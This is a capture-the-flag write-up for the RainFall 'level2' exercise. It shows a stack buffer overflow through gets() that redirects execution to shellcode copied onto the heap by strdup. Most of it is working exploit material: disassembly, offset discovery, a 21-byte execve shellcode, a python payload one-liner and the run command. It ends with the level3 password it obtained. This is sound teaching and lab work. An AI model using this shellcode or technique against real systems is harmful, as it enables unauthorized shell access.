# level2

This exercise is more complicated.

First, we decompile the C code and perform the initial analysis of the binary.

The code structure is as follows:
```c
#include "out.h"

void p(void)
{
  uint unaff_retaddr;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)
{
  p();
  return;
}
```

We have a function `p` that checks:
```c
if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
```
This check prevents a direct jump back to stack memory (which typically begins with `0xb`).

However, the program subsequently calls `puts` and `strdup`.
The call to `strdup` is key. It duplicates our input onto the heap. This allows us to execute shellcode from the heap instead of the stack. Let's inspect the disassembly of the functions using GDB:

```text
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
...
0x080484d4  p
0x0804853f  main
...
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:   call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

The disassembled assembly code of `p` matches the C structure. We can observe the filter check (`cmp`) and the subsequent memory allocation via `strdup`.

To exploit this, we want to overwrite the saved return address (EIP) with the address of our shellcode. Since the program duplicates our input to the heap using `strdup`, we can place our shellcode inside the input buffer, let `strdup` copy it to the heap, and then redirect EIP to point to this heap address. When the function returns, execution will jump to the heap and run the shellcode.

We first need to determine the heap address where `strdup` duplicates our input buffer.

### Q&A

* **Are we performing two buffer overflows?**
  No. The heap copy performed by `strdup` is entirely legitimate. We use it to store our shellcode at a predictable heap address, which we then pass to EIP.
* **Where does the overflow occur?**
  The overflow occurs in `gets()`, where we write past the stack buffer until we reach and overwrite the saved return address (EIP) with the address of our heap buffer.
* **Why do we need the heap address?**
  We are executing two steps simultaneously: `strdup` copies our input containing the shellcode to a stable heap location, and our stack overflow redirects EIP to point to that heap location so the program branches to the shellcode upon return.

### Finding the Heap Address

There are two ways to retrieve this address:
1. **Using `ltrace`:** Run the binary with `ltrace` to track the heap allocation of `strdup`:
   ```bash
   level2@RainFall:~$ ltrace ./level2
   __libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
   fflush(0xb7fd1a20)                                              = 0
   gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                   = 0xbffff70c
   puts("")                                                        = 1
   strdup("")                                                      = 0x0804a008
   +++ exited (status 8) +++
   ```
2. **Using GDB:** We place a breakpoint right after `strdup` (before `leave` at `0x0804853d`) and inspect the registers:
   ```text
   (gdb) break *0x0804853d
   (gdb) run
   lmao
   lmao

   Breakpoint 1, 0x0804853d in p ()
   (gdb) info registers
   eax            0x804a008	134520840
   ```
   The return value in `eax` confirms the allocated heap address is `0x0804a008`.

### Finding the Offset

To find the number of bytes required to reach the saved return address, we supply a 200-character test pattern:
`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`

We run the program inside GDB and feed the pattern:
```text
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers eip
eip            0x37634136	0x37634136
```
The crash occurs at address `0x37634136` (which corresponds to `6Ac7` in ASCII), pointing to an offset of exactly **80** bytes.

### Exploit Code

We will use a standard 21-byte shellcode:
`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`

Padding calculation:
`80 (offset) - 21 (shellcode) = 59` bytes of padding.

We construct our exploit command (using `[::-1]` to write the target heap address in little-endian format):
```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\x04\xa0\x08"[::-1]' > payload
```

And finally, we execute the exploit, keeping the stdin stream open:
```bash
(cat payload; cat) | ./level2
```

We obtain our shell and read the password for `level3`:
```bash
cd ..
cd level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
